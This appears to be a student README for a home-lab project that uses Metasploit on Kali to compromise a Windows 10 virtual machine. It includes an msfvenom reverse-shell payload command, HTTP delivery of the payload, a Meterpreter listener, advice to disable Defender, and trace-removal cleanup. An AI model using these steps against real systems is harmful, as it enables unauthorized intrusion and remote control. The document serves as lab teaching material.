# Metasploit Penetration Testing Project

## üìå Overview
For my project I demonstrated the use of **Metasploit Framework** to exploit a **Windows 10 VM** using a **Kali Linux VM** as the attacker. It covers the full penetration testing process, from setting up the environment to executing post-exploitation techniques.

## üîß Installation & Setup

### **1Ô∏è‚É£ Install VMware Workstation Pro**
- Download and install VMware Workstation Pro from [VMware‚Äôs official site](https://www.vmware.com/products/workstation-pro.html).

### **2Ô∏è‚É£ Set Up Virtual Machines**
#### **Kali Linux VM (Attacker)**
- Download the latest **Kali Linux** ISO from [Kali‚Äôs official website](https://www.kali.org/).
- Install Kali on VMware and ensure **Metasploit Framework** is installed:
  ```bash
  sudo apt update && sudo apt install metasploit-framework -y

Windows 10 VM (Target)
- Install a Windows 10 virtual machine.
- Disable Windows Defender to prevent automatic deletion of the payload.

3Ô∏è‚É£ Configure Network Settings
I used the Bridged Adapter for both VMs to allow network communication.
Check IP addresses:
ip a   # On Kali
ipconfig   # On Windows (Command Prompt)

üéØ Exploitation Steps
1Ô∏è‚É£ Generate Payload (Malicious Executable)
Run the following msfvenom command on Kali to create a reverse shell payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_Kali_IP> LPORT=4444 -f exe > payload.exe

2Ô∏è‚É£ Transfer Payload to Windows 10
Use a USB drive:
- sudo cp payload.exe /media/kali/USB_NAME/
- python3 -m http.server 8080
- http://<Your_Kali_IP>:8080/payload.exe

3Ô∏è‚É£ Start the Metasploit Listener
Launch Metasploit and set up the exploit:
msfconsole #start metasploit
- use exploit/multi/handler
- set payload windows/meterpreter/reverse_tcp
- set LHOST <Your_Kali_IP>
- set LPORT 4444
- exploit

4Ô∏è‚É£ Execute Payload on Windows
Run payload.exe on Windows. If successful, Meterpreter will open:
meterpreter >

üî• Post-Exploitation Techniques
Once inside Meterpreter, try these:

Check system info:
- sysinfo
- getuid
- screenshot

üõë Cleanup & Exit
To remove traces and exit:
- rm C:\\Users\\Public\\payload.exe
- exit
- sessions -K

‚öñÔ∏è Legal & Ethical Considerations
This project is intended for educational purposes only. Unauthorized penetration testing is illegal under the Computer Fraud and Abuse Act (CFAA). Only perform tests in authorized environments with explicit permission.

I hacked a windows 10 vm on my personal Virtual Machine! so if you plan on doing this, please be responisble! 

Always hack responsibly! üöÄ
